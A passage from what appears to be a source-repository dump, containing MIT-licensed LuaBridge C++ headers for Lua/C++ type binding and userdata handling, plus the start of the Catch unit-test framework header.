    return static_cast <long> (luaL_checknumber (L, index));
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `unsigned long`.
*/
template <>
struct Stack <unsigned long>
{
  static inline void push (lua_State* L, unsigned long value)
  {
    lua_pushinteger (L, static_cast <lua_Integer> (value));
  }
  
  static inline unsigned long get (lua_State* L, int index)
  {
    return static_cast <unsigned long> (luaL_checkinteger (L, index));
  }
};

template <>
struct Stack <unsigned long const&>
{
  static inline void push (lua_State* L, unsigned long value)
  {
    lua_pushnumber (L, static_cast <lua_Number> (value));
  }
  
  static inline unsigned long get (lua_State* L, int index)
  {
    return static_cast <unsigned long> (luaL_checknumber (L, index));
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `float`.
*/
template <>
struct Stack <float>
{
  static inline void push (lua_State* L, float value)
  {
    lua_pushnumber (L, static_cast <lua_Number> (value));
  }
  
  static inline float get (lua_State* L, int index)
  {
    return static_cast <float> (luaL_checknumber (L, index));
  }
};

template <>
struct Stack <float const&>
{
  static inline void push (lua_State* L, float value)
  {
    lua_pushnumber (L, static_cast <lua_Number> (value));
  }
  
  static inline float get (lua_State* L, int index)
  {
    return static_cast <float> (luaL_checknumber (L, index));
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `double`.
*/
template <> struct Stack <double>
{
  static inline void push (lua_State* L, double value)
  {
    lua_pushnumber (L, static_cast <lua_Number> (value));
  }
  
  static inline double get (lua_State* L, int index)
  {
    return static_cast <double> (luaL_checknumber (L, index));
  }
};

template <> struct Stack <double const&>
{
  static inline void push (lua_State* L, double value)
  {
    lua_pushnumber (L, static_cast <lua_Number> (value));
  }
  
  static inline double get (lua_State* L, int index)
  {
    return static_cast <double> (luaL_checknumber (L, index));
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `bool`.
*/
template <>
struct Stack <bool> {
  static inline void push (lua_State* L, bool value)
  {
    lua_pushboolean (L, value ? 1 : 0);
  }
  
  static inline bool get (lua_State* L, int index)
  {
    return lua_toboolean (L, index) ? true : false;
  }
};

template <>
struct Stack <bool const&> {
  static inline void push (lua_State* L, bool value)
  {
    lua_pushboolean (L, value ? 1 : 0);
  }
  
  static inline bool get (lua_State* L, int index)
  {
    return lua_toboolean (L, index) ? true : false;
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `char`.
*/
template <>
struct Stack <char>
{
  static inline void push (lua_State* L, char value)
  {
    char str [2] = { value, 0 };
    lua_pushstring (L, str);
  }
  
  static inline char get (lua_State* L, int index)
  {
    return luaL_checkstring (L, index) [0];
  }
};

template <>
struct Stack <char const&>
{
  static inline void push (lua_State* L, char value)
  {
    char str [2] = { value, 0 };
    lua_pushstring (L, str);
  }
  
  static inline char get (lua_State* L, int index)
  {
    return luaL_checkstring (L, index) [0];
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `float`.
*/
template <>
struct Stack <char const*>
{
  static inline void push (lua_State* L, char const* str)
  {
    if (str != 0)
      lua_pushstring (L, str);
    else
      lua_pushnil (L);
  }

  static inline char const* get (lua_State* L, int index)
  {
    return lua_isnil (L, index) ? 0 : luaL_checkstring (L, index);
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `std::string`.
*/
template <>
struct Stack <std::string>
{
  static inline void push (lua_State* L, std::string const& str)
  {
    lua_pushlstring (L, str.c_str (), str.size());
  }

  static inline std::string get (lua_State* L, int index)
  {
    size_t len;
    const char *str = luaL_checklstring(L, index, &len);
    return std::string (str, len);
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `std::string const&`.
*/
template <>
struct Stack <std::string const&>
{
  static inline void push (lua_State* L, std::string const& str)
  {
    lua_pushlstring (L, str.c_str(), str.size());
  }

  static inline std::string get (lua_State* L, int index)
  {
    size_t len;
    const char *str = luaL_checklstring(L, index, &len);
    return std::string (str, len);
  }
};

```

`libs/LuaBridge/detail/TypeList.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>
  Copyright 2007, Nathan Reed

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.

  This file incorporates work covered by the following copyright and
  permission notice:  

    The Loki Library
    Copyright (c) 2001 by Andrei Alexandrescu
    This code accompanies the book:
    Alexandrescu, Andrei. "Modern C++ Design: Generic Programming and Design 
        Patterns Applied". Copyright (c) 2001. Addison-Wesley.
    Permission to use, copy, modify, distribute and sell this software for any 
        purpose is hereby granted without fee, provided that the above copyright 
        notice appear in all copies and that both that copyright notice and this 
        permission notice appear in supporting documentation.
    The author or Addison-Welsey Longman make no representations about the 
        suitability of this software for any purpose. It is provided "as is" 
        without express or implied warranty.
*/
//==============================================================================

/**
  None type means void parameters or return value.
*/
typedef void None;

template <typename Head, typename Tail = None>
struct TypeList
{
};

/**
  A TypeList with actual values.
*/
template <typename List>
struct TypeListValues
{
  static std::string const tostring (bool)
  {
    return "";
  }
};

/**
  TypeListValues recursive template definition.
*/
template <typename Head, typename Tail>
struct TypeListValues <TypeList <Head, Tail> >
{
  Head hd;
  TypeListValues <Tail> tl;

  TypeListValues (Head hd_, TypeListValues <Tail> const& tl_)
    : hd (hd_), tl (tl_)
  {
  }

  static std::string const tostring (bool comma = false)
  {
    std::string s;

    if (comma)
      s = ", ";

    s = s + typeid (Head).name ();

    return s + TypeListValues <Tail>::tostring (true);
  }
};

// Specializations of type/value list for head types that are references and
// const-references.  We need to handle these specially since we can't count
// on the referenced object hanging around for the lifetime of the list.

template <typename Head, typename Tail>
struct TypeListValues <TypeList <Head&, Tail> >
{
  Head hd;
  TypeListValues <Tail> tl;

  TypeListValues (Head& hd_, TypeListValues <Tail> const& tl_)
    : hd (hd_), tl (tl_)
  {
  }

  static std::string const tostring (bool comma = false)
  {
    std::string s;

    if (comma)
      s = ", ";

    s = s + typeid (Head).name () + "&";

    return s + TypeListValues <Tail>::tostring (true);
  }
};

template <typename Head, typename Tail>
struct TypeListValues <TypeList <Head const&, Tail> >
{
  Head hd;
  TypeListValues <Tail> tl;

  TypeListValues (Head const& hd_, const TypeListValues <Tail>& tl_)
    : hd (hd_), tl (tl_)
  {
  }

  static std::string const tostring (bool comma = false)
  {
    std::string s;

    if (comma)
      s = ", ";

    s = s + typeid (Head).name () + " const&";

    return s + TypeListValues <Tail>::tostring (true);
  }
};

//==============================================================================
/**
  Subclass of a TypeListValues constructable from the Lua stack.
*/

template <typename List, int Start = 1>
struct ArgList
{
};

template <int Start>
struct ArgList <None, Start> : public TypeListValues <None>
{
  ArgList (lua_State*)
  {
  }
};

template <typename Head, typename Tail, int Start>
struct ArgList <TypeList <Head, Tail>, Start>
  : public TypeListValues <TypeList <Head, Tail> >
{
  ArgList (lua_State* L)
    : TypeListValues <TypeList <Head, Tail> > (Stack <Head>::get (L, Start),
                                            ArgList <Tail, Start + 1> (L))
  {
  }
};

```

`libs/LuaBridge/detail/TypeTraits.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

#ifndef LUABRIDGE_TYPEINFO_HEADER
#define LUABRIDGE_TYPEINFO_HEADER

//------------------------------------------------------------------------------
/**
    Container traits.

    Unspecialized ContainerTraits has the isNotContainer typedef for SFINAE.
    All user defined containers must supply an appropriate specialization for
    ContinerTraits (without the typedef isNotContainer). The containers that
    come with LuaBridge also come with the appropriate ContainerTraits
    specialization. See the corresponding declaration for details.

    A specialization of ContainerTraits for some generic type ContainerType
    looks like this:

        template <class T>
        struct ContainerTraits <ContainerType <T> >
        {
          typedef typename T Type;

          static T* get (ContainerType <T> const& c)
          {
            return c.get (); // Implementation-dependent on ContainerType
          }
        };
*/
template <class T>
struct ContainerTraits
{
  typedef bool isNotContainer;
};

//------------------------------------------------------------------------------
/**
    Type traits.

    Specializations return information about a type.
*/
struct TypeTraits
{
  /** Determine if type T is a container.

      To be considered a container, there must be a specialization of
      ContainerTraits with the required fields.
  */
  template <typename T>
  class isContainer
  {
  private:
    typedef char yes[1]; // sizeof (yes) == 1
    typedef char no [2]; // sizeof (no)  == 2

    template <typename C>
    static no& test (typename C::isNotContainer*);
 
    template <typename>
    static yes& test (...);
 
  public:
    static const bool value = sizeof (test <ContainerTraits <T> >(0)) == sizeof (yes);
  };

  /** Determine if T is const qualified.
  */
  /** @{ */
  template <class T>
  struct isConst
  {
    static bool const value = false;
  };

  template <class T>
  struct isConst <T const>
  {
    static bool const value = true;
  };
  /** @} */

  /** Remove the const qualifier from T.
  */
  /** @{ */
  template <class T>
  struct removeConst
  {
    typedef T Type;
  };

  template <class T>
  struct removeConst <T const>
  {
    typedef T Type;
  };
  /**@}*/
};

#endif

```

`libs/LuaBridge/detail/Userdata.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

//==============================================================================
/**
  Return the identity pointer for our lightuserdata tokens.

  LuaBridge metatables are tagged with a security "token." The token is a
  lightuserdata created from the identity pointer, used as a key in the
  metatable. The value is a boolean = true, although any value could have been
  used.

  Because of Lua's dynamic typing and our improvised system of imposing C++
  class structure, there is the possibility that executing scripts may
  knowingly or unknowingly cause invalid data to get passed to the C functions
  created by LuaBridge. In particular, our security model addresses the
  following:

  Notes:
    1. Scripts cannot create a userdata (ignoring the debug lib).
    2. Scripts cannot create a lightuserdata (ignoring the debug lib).
    3. Scripts cannot set the metatable on a userdata.
    4. Our identity key is a unique pointer in the process.
    5. Our metatables have a lightuserdata identity key / value pair.
    6. Our metatables have "__metatable" set to a boolean = false.
    7. Our lightuserdata is unique.
*/
inline void* getIdentityKey ()
{
  static char value;
  return &value;
}

/**
  Interface to a class pointer retrievable from a userdata.
*/
class Userdata
{
protected:
  void* m_p; // subclasses must set this

  //--------------------------------------------------------------------------
  /**
    Get an untyped pointer to the contained class.
  */
  inline void* const getPointer ()
  {
    return m_p;
  }

private:
  //--------------------------------------------------------------------------
  /**
    Validate and retrieve a Userdata on the stack.

    The Userdata must exactly match the corresponding class table or
    const table, or else a Lua error is raised. This is used for the
    __gc metamethod.
  */
  static Userdata* getExactClass (lua_State* L,
                                  int narg,
                                  void const* classKey)
  {
    Userdata* ud = 0;
    int const index = lua_absindex (L, narg);

    bool mismatch = false;
    char const* got = 0;

    lua_rawgetp (L, LUA_REGISTRYINDEX, classKey);
    assert (lua_istable (L, -1));

    // Make sure we have a userdata.
    if (!lua_isuserdata (L, index))
      mismatch = true;

    // Make sure it's metatable is ours.
    if (!mismatch)
    {
      lua_getmetatable (L, index);
      lua_rawgetp (L, -1, getIdentityKey ());
      if (lua_isboolean (L, -1))
      {
        lua_pop (L, 1);
      }
      else
      {
        lua_pop (L, 2);
        mismatch = true;
      }      
    }

    if (!mismatch)
    {
      if (lua_rawequal (L, -1, -2))
      {
        // Matches class table.
        lua_pop (L, 2);
        ud = static_cast <Userdata*> (lua_touserdata (L, index));
      }
      else
      {
        rawgetfield (L, -2, "__const");
        if (lua_rawequal (L, -1, -2))
        {
          // Matches const table
          lua_pop (L, 3);
          ud = static_cast <Userdata*> (lua_touserdata (L, index));
        }
        else
        {
          // Mismatch, but its one of ours so get a type name.
          rawgetfield (L, -2, "__type");
          lua_insert (L, -4);
          lua_pop (L, 2);
          got = lua_tostring (L, -2);
          mismatch = true;
        }
      }
    }

    if (mismatch)
    {
      rawgetfield (L, -1, "__type");
      assert (lua_type (L, -1) == LUA_TSTRING);
      char const* const expected = lua_tostring (L, -1);

      if (got == 0)
        got = lua_typename (L, lua_type (L, index));

      char const* const msg = lua_pushfstring (
        L, "%s expected, got %s", expected, got);

      if (narg > 0)
        luaL_argerror (L, narg, msg);
      else
        lua_error (L);
    }

    return ud;
  }

  //--------------------------------------------------------------------------
  /**
    Validate and retrieve a Userdata on the stack.

    The Userdata must be derived from or the same as the given base class,
    identified by the key. If canBeConst is false, generates an error if
    the resulting Userdata represents to a const object. We do the type check
    first so that the error message is informative.
  */
  static Userdata* getClass (lua_State* L,
                             int index,
                             void const* baseClassKey,
                             bool canBeConst)
  {
    assert (index > 0);
    Userdata* ud = 0;

    bool mismatch = false;
    char const* got = 0;

    lua_rawgetp (L, LUA_REGISTRYINDEX, baseClassKey);
    assert (lua_istable (L, -1));

    // Make sure we have a userdata.
    if (lua_isuserdata (L, index))
    {
      // Make sure it's metatable is ours.
      lua_getmetatable (L, index);
      lua_rawgetp (L, -1, getIdentityKey ());
      if (lua_isboolean (L, -1))
      {
        lua_pop (L, 1);

        // If __const is present, object is NOT const.
        rawgetfield (L, -1, "__const");
        assert (lua_istable (L, -1) || lua_isnil (L, -1));
        bool const isConst = lua_isnil (L, -1);
        lua_pop (L, 1);

        // Replace the class table with the const table if needed.
        if (isConst)
        {
          rawgetfield (L, -2, "__const");
          assert (lua_istable (L, -1));
          lua_replace (L, -3);
        }

        for (;;)
        {
          if (lua_rawequal (L, -1, -2))
          {
            lua_pop (L, 2);

            // Match, now check const-ness.
            if (isConst && !canBeConst)
            {
              luaL_argerror (L, index, "cannot be const");
            }
            else
            {
              ud = static_cast <Userdata*> (lua_touserdata (L, index));
              break;
            }
          }
          else
          {
            // Replace current metatable with it's base class.
            rawgetfield (L, -1, "__parent");
/*
ud
class metatable
ud metatable
ud __parent (nil)
*/

            if (lua_isnil (L, -1))
            {
              lua_remove (L, -1);
              // Mismatch, but its one of ours so get a type name.
              rawgetfield (L, -1, "__type");
              lua_insert (L, -3);
              lua_pop (L, 1);
              got = lua_tostring (L, -2);
              mismatch = true;
              break;
            }
            else
            {
              lua_remove (L, -2);
            }
          }
        }
      }
      else
      {
        lua_pop (L, 2);
        mismatch = true;
      }      
    }
    else
    {
      mismatch = true;
    }

    if (mismatch)
    {
      assert (lua_type (L, -1) == LUA_TTABLE);
      rawgetfield (L, -1, "__type");
      assert (lua_type (L, -1) == LUA_TSTRING);
      char const* const expected = lua_tostring (L, -1);

      if (got == 0)
        got = lua_typename (L, lua_type (L, index));

      char const* const msg = lua_pushfstring (
        L, "%s expected, got %s", expected, got);

      luaL_argerror (L, index, msg);
    }

    return ud;
  }

public:
  virtual ~Userdata () { }

  //--------------------------------------------------------------------------
  /**
    Returns the Userdata* if the class on the Lua stack matches.

    If the class does not match, a Lua error is raised.
  */
  template <class T>
  static inline Userdata* getExact (lua_State* L, int index)
  {
    return getExactClass (L, index, ClassInfo <T>::getClassKey ());
  }

  //--------------------------------------------------------------------------
  /**
    Get a pointer to the class from the Lua stack.

    If the object is not the class or a subclass, or it violates the
    const-ness, a Lua error is raised.
  */
  template <class T>
  static inline T* get (lua_State* L, int index, bool canBeConst)
  {
    if (lua_isnil (L, index))
      return 0;
    else
      return static_cast <T*> (getClass (L, index,
        ClassInfo <T>::getClassKey (), canBeConst)->getPointer ());
  }
};

//----------------------------------------------------------------------------
/**
  Wraps a class object stored in a Lua userdata.

  The lifetime of the object is managed by Lua. The object is constructed
  inside the userdata using placement new.
*/
template <class T>
class UserdataValue : public Userdata
{
private:
  UserdataValue <T> (UserdataValue <T> const&);
  UserdataValue <T> operator= (UserdataValue <T> const&);

  char m_storage [sizeof (T)];

  inline T* getObject ()
  {
    // If this fails to compile it means you forgot to provide
    // a Container specialization for your container!
    //
    return reinterpret_cast <T*> (&m_storage [0]);
  }

private:
  /**
    Used for placement construction.
  */
  UserdataValue ()
  {
    m_p = getObject ();
  }

  ~UserdataValue ()
  {
    getObject ()->~T ();
  }

public:
  /**
    Push a T via placement new.

    The caller is responsible for calling placement new using the
    returned uninitialized storage.
  */
  static void* place (lua_State* const L)
  {
    UserdataValue <T>* const ud = new (
      lua_newuserdata (L, sizeof (UserdataValue <T>))) UserdataValue <T> ();
    lua_rawgetp (L, LUA_REGISTRYINDEX, ClassInfo <T>::getClassKey ());
    // If this goes off it means you forgot to register the class!
    assert (lua_istable (L, -1));
    lua_setmetatable (L, -2);
    return ud->getPointer ();
  }

  /**
    Push T via copy construction from U.
  */
  template <class U>
  static inline void push (lua_State* const L, U const& u)
  {
    new (place (L)) U (u);
  }
};

//----------------------------------------------------------------------------
/**
  Wraps a pointer to a class object inside a Lua userdata.

  The lifetime of the object is managed by C++.
*/
class UserdataPtr : public Userdata
{
private:
  UserdataPtr (UserdataPtr const&);
  UserdataPtr operator= (UserdataPtr const&);

private:
  /** Push non-const pointer to object using metatable key.
  */
  static void push (lua_State* L, void* const p, void const* const key)
  {
    if (p)
    {
      new (lua_newuserdata (L, sizeof (UserdataPtr))) UserdataPtr (p);
      lua_rawgetp (L, LUA_REGISTRYINDEX, key);
      // If this goes off it means you forgot to register the class!
      assert (lua_istable (L, -1));
      lua_setmetatable (L, -2);
    }
    else
    {
      lua_pushnil (L);
    }
  }

  /** Push const pointer to object using metatable key.
  */
  static void push (lua_State* L, void const* const p, void const* const key)
  {
    if (p)
    {
      new (lua_newuserdata (L, sizeof (UserdataPtr)))
        UserdataPtr (const_cast <void*> (p));
      lua_rawgetp (L, LUA_REGISTRYINDEX, key);
      // If this goes off it means you forgot to register the class!
      assert (lua_istable (L, -1));
      lua_setmetatable (L, -2);
    }
    else
    {
      lua_pushnil (L);
    }
  }

  explicit UserdataPtr (void* const p)
  {
    m_p = p;

    // Can't construct with a null pointer!
    //
    assert (m_p != 0);
  }

public:
  /** Push non-const pointer to object.
  */
  template <class T>
  static inline void push (lua_State* const L, T* const p)
  {
    if (p)
      push (L, p, ClassInfo <T>::getClassKey ());
    else
      lua_pushnil (L);
  }

  /** Push const pointer to object.
  */
  template <class T>
  static inline void push (lua_State* const L, T const* const p)
  {
    if (p)
      push (L, p, ClassInfo <T>::getConstKey ());
    else
      lua_pushnil (L);
  }
};

//============================================================================
/**
  Wraps a container thet references a class object.

  The template argument C is the container type, ContainerTraits must be
  specialized on C or else a compile error will result.
*/
template <class C>
class UserdataShared : public Userdata
{
private:
  UserdataShared (UserdataShared <C> const&);
  UserdataShared <C>& operator= (UserdataShared <C> const&);

  typedef typename TypeTraits::removeConst <
    typename ContainerTraits <C>::Type>::Type T;

  C m_c;

private:
  ~UserdataShared ()
  {
  }

public:
  /**
    Construct from a container to the class or a derived class.
  */
  template <class U>
  explicit UserdataShared (U const& u) : m_c (u)
  {
    m_p = const_cast <void*> (reinterpret_cast <void const*> (
        (ContainerTraits <C>::get (m_c))));
  }

  /**
    Construct from a pointer to the class or a derived class.
  */
  template <class U>
  explicit UserdataShared (U* u) : m_c (u)
  {
    m_p = const_cast <void*> (reinterpret_cast <void const*> (
        (ContainerTraits <C>::get (m_c))));
  }
};

//----------------------------------------------------------------------------
//
// SFINAE helpers.
//

// non-const objects
template <class C, bool makeObjectConst>
struct UserdataSharedHelper
{
  typedef typename TypeTraits::removeConst <
    typename ContainerTraits <C>::Type>::Type T;

  static void push (lua_State* L, C const& c)
  {
    if (ContainerTraits <C>::get (c) != 0)
    {
      new (lua_newuserdata (L, sizeof (UserdataShared <C>))) UserdataShared <C> (c);
      lua_rawgetp (L, LUA_REGISTRYINDEX, ClassInfo <T>::getClassKey ());
      // If this goes off it means the class T is unregistered!
      assert (lua_istable (L, -1));
      lua_setmetatable (L, -2);
    }
    else
    {
      lua_pushnil (L);
    }
  }

  static void push (lua_State* L, T* const t)
  {
    if (t)
    {
      new (lua_newuserdata (L, sizeof (UserdataShared <C>))) UserdataShared <C> (t);
      lua_rawgetp (L, LUA_REGISTRYINDEX, ClassInfo <T>::getClassKey ());
      // If this goes off it means the class T is unregistered!
      assert (lua_istable (L, -1));
      lua_setmetatable (L, -2);
    }
    else
    {
      lua_pushnil (L);
    }
  }
};

// const objects
template <class C>
struct UserdataSharedHelper <C, true>
{
  typedef typename TypeTraits::removeConst <
    typename ContainerTraits <C>::Type>::Type T;

  static void push (lua_State* L, C const& c)
  {
    if (ContainerTraits <C>::get (c) != 0)
    {
      new (lua_newuserdata (L, sizeof (UserdataShared <C>))) UserdataShared <C> (c);
      lua_rawgetp (L, LUA_REGISTRYINDEX, ClassInfo <T>::getConstKey ());
      // If this goes off it means the class T is unregistered!
      assert (lua_istable (L, -1));
      lua_setmetatable (L, -2);
    }
    else
    {
      lua_pushnil (L);
    }
  }

  static void push (lua_State* L, T* const t)
  {
    if (t)
    {
      new (lua_newuserdata (L, sizeof (UserdataShared <C>))) UserdataShared <C> (t);
      lua_rawgetp (L, LUA_REGISTRYINDEX, ClassInfo <T>::getConstKey ());
      // If this goes off it means the class T is unregistered!
      assert (lua_istable (L, -1));
      lua_setmetatable (L, -2);
    }
    else
    {
      lua_pushnil (L);
    }
  }
};

/**
  Pass by container.

  The container controls the object lifetime. Typically this will be a
  lifetime shared by C++ and Lua using a reference count. Because of type
  erasure, containers like std::shared_ptr will not work. Containers must
  either be of the intrusive variety, or in the style of the RefCountedPtr
  type provided by LuaBridge (that uses a global hash table).
*/
template <class C, bool byContainer>
struct StackHelper
{
  static inline void push (lua_State* L, C const& c)
  {
    UserdataSharedHelper <C,
      TypeTraits::isConst <typename ContainerTraits <C>::Type>::value>::push (L, c);
  }

  typedef typename TypeTraits::removeConst <
    typename ContainerTraits <C>::Type>::Type T;

  static inline C get (lua_State* L, int index)
  {
    return Userdata::get <T> (L, index, true);
  }
};

/**
  Pass by value.

  Lifetime is managed by Lua. A C++ function which accesses a pointer or
  reference to an object outside the activation record in which it was
  retrieved may result in undefined behavior if Lua garbage collected it.
*/
template <class T>
struct StackHelper <T, false>
{
  static inline void push (lua_State* L, T const& t)
  {
    UserdataValue <T>::push (L, t);
  }

  static inline T const& get (lua_State* L, int index)
  {
    return *Userdata::get <T> (L, index, true);
  }
};

//==============================================================================

/**
  Lua stack conversions for class objects passed by value.
*/
template <class T>
struct Stack
{
public:
  static inline void push (lua_State* L, T const& t)
  {
    StackHelper <T,
      TypeTraits::isContainer <T>::value>::push (L, t);
  }

  static inline T get (lua_State* L, int index)
  {
    return StackHelper <T,
      TypeTraits::isContainer <T>::value>::get (L, index);
  }
};

//------------------------------------------------------------------------------
/**
  Lua stack conversions for pointers and references to class objects.

  Lifetime is managed by C++. Lua code which remembers a reference to the
  value may result in undefined behavior if C++ destroys the object. The
  handling of the const and volatile qualifiers happens in UserdataPtr.
*/

// pointer
template <class T>
struct Stack <T*>
{
  static inline void push (lua_State* L, T* const p)
  {
    UserdataPtr::push (L, p);
  }

  static inline T* const get (lua_State* L, int index)
  {
    return Userdata::get <T> (L, index, false);
  }
};

// Strips the const off the right side of *
template <class T>
struct Stack <T* const>
{
  static inline void push (lua_State* L, T* const p)
  {
    UserdataPtr::push (L, p);
  }

  static inline T* const get (lua_State* L, int index)
  {
    return Userdata::get <T> (L, index, false);
  }
};

// pointer to const
template <class T>
struct Stack <T const*>
{
  static inline void push (lua_State* L, T const* const p)
  {
    UserdataPtr::push (L, p);
  }

  static inline T const* const get (lua_State* L, int index)
  {
    return Userdata::get <T> (L, index, true);
  }
};

// Strips the const off the right side of *
template <class T>
struct Stack <T const* const>
{
  static inline void push (lua_State* L, T const* const p)
  {
    UserdataPtr::push (L, p);
  }

  static inline T const* const get (lua_State* L, int index)
  {
    return Userdata::get <T> (L, index, true);
  }
};

// reference
template <class T>
struct Stack <T&>
{
  static inline void push (lua_State* L, T& t)
  {
    UserdataPtr::push (L, &t);
  }

  static T& get (lua_State* L, int index)
  {
    T* const t = Userdata::get <T> (L, index, false);
    if (!t)
      luaL_error (L, "nil passed to reference");
    return *t;
  }
};

template <class C, bool byContainer>
struct RefStackHelper
{
  typedef C return_type;  
	
  static inline void push (lua_State* L, C const& t)
  {
    UserdataSharedHelper <C,
      TypeTraits::isConst <typename ContainerTraits <C>::Type>::value>::push (L, t);
  }

  typedef typename TypeTraits::removeConst <
    typename ContainerTraits <C>::Type>::Type T;

  static return_type get (lua_State* L, int index)
  {
    return Userdata::get <T> (L, index, true);
  }
};

template <class T>
struct RefStackHelper <T, false>
{
  typedef T const& return_type;  
	
	static inline void push (lua_State* L, T const& t)
	{
	  UserdataPtr::push (L, &t);
	}

  static return_type get (lua_State* L, int index)
  {
    T const* const t = Userdata::get <T> (L, index, true);

    if (!t)
      luaL_error (L, "nil passed to reference");
    return *t;
  }
    
};

// reference to const
template <class T>
struct Stack <T const&>
{
  typedef RefStackHelper <T, TypeTraits::isContainer <T>::value> helper_t;
  
  static inline void push (lua_State* L, T const& t)
  {
    helper_t::push (L, t);
  }

  static typename helper_t::return_type get (lua_State* L, int index)
  {
    return helper_t::get (L, index);
  }
};

```

`libs/LuaBridge/detail/dump.h`:

```h
#include <sstream>
#include <string>

std::string dumpLuaState(lua_State *L) {
	std::stringstream ostr;
	int i;
	int top = lua_gettop(L);
	ostr << "top=" << top << ":\n";
	for (i = 1; i <= top; ++i) {
		int t = lua_type(L, i);
		switch(t) {
		case LUA_TSTRING:
			ostr << "  " << i << ": '" << lua_tostring(L, i) << "'\n";
			break;
		case LUA_TBOOLEAN:
			ostr << "  " << i << ": " << 
					(lua_toboolean(L, i) ? "true" : "false") << "\n";
			break;
		case LUA_TNUMBER:
			ostr << "  " << i << ": " << lua_tonumber(L, i) << "\n";
			break;
		default:
			ostr << "  " << i << ": TYPE=" << lua_typename(L, t) << "\n";
			break;
		}
	}
	return ostr.str();
}

```

`libs/PolyHook/CatchUnitTest.h`:

```h

/*
*  Catch v1.5.2
*  Generated: 2016-05-07 23:13:51.221005
*  ----------------------------------------------------------
*  This file has been merged from multiple headers. Please don't edit it directly
*  Copyright (c) 2012 Two Blue Cubes Ltd. All rights reserved.
*
*  Distributed under the Boost Software License, Version 1.0. (See accompanying
*  file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
*/
#ifndef TWOBLUECUBES_SINGLE_INCLUDE_CATCH_HPP_INCLUDED
#define TWOBLUECUBES_SINGLE_INCLUDE_CATCH_HPP_INCLUDED

#define TWOBLUECUBES_CATCH_HPP_INCLUDED

#ifdef __clang__
#    pragma clang system_header
#elif defined __GNUC__
#    pragma GCC system_header
#endif

// #included from: internal/catch_suppress_warnings.h

#ifdef __clang__
#   ifdef __ICC // icpc defines the __clang__ macro
#       pragma warning(push)
#       pragma warning(disable: 161 1682)
#   else // __ICC
#       pragma clang diagnostic ignored "-Wglobal-constructors"
#       pragma clang diagnostic ignored "-Wvariadic-macros"
#       pragma clang diagnostic ignored "-Wc99-extensions"
#       pragma clang diagnostic ignored "-Wunused-variable"
#       pragma clang diagnostic push
#       pragma clang diagnostic ignored "-Wpadded"
#       pragma clang diagnostic ignored "-Wc++98-compat"
#       pragma clang diagnostic ignored "-Wc++98-compat-pedantic"
#       pragma clang diagnostic ignored "-Wswitch-enum"
